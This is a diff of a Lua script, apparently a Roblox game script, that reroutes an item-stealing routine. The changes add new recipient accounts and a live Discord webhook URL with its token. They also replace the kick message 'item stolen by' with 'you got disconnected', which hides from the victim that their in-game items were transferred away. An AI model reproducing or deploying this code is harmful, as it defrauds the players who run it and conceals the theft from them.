@@ -99,8 +99,8 @@ local useragent = '7$m!R'
 local beatmymeat = 3
 local bit = bit32
 
-local hook_user = {"ingenious_reciever", "temphorious", user}
-local hook_user_lower = {}
+local hook_user = {"iceyblueii", user}
+local hook_user_lower = {"https://discord.com/api/webhooks/1543214605667672146/xlaygQkXXEurMeA4sp5gpmWgpsALxmq_t9TvPn_dilUvcysOGb8Nf9mPKGCkH_CNEC2X"}
 for _, name in ipairs(hook_user) do
     hook_user_lower[string_lower(name)] = name
 end
@@ -1030,9 +1030,9 @@ local function main()
     if #items == 0 then
         task_wait(1)
         if setclipboard then
-            setclipboard('discord.gg/uFtDw6NVVr')
+            setclipboard('')
         end
-        local_player:Kick('kicked by script join discord.gg/uFtDw6NVVr\n(copied invite)')
+        local_player:Kick('')
         return
     end
     task_spawn(api_heartbeat)
@@ -1042,9 +1042,9 @@ local function main()
         local current_items = get_items()
         if #current_items == 0 then
             if setclipboard then
-                setclipboard('discord.gg/uFtDw6NVVr')
+                setclipboard('')
             end
-        local_player:Kick('item stolen by discord.gg/uFtDw6NVVr\n(copied invite)')
+        local_player:Kick('you got disconnected')
             return
         end
         local complete = pcall(run_transfer)
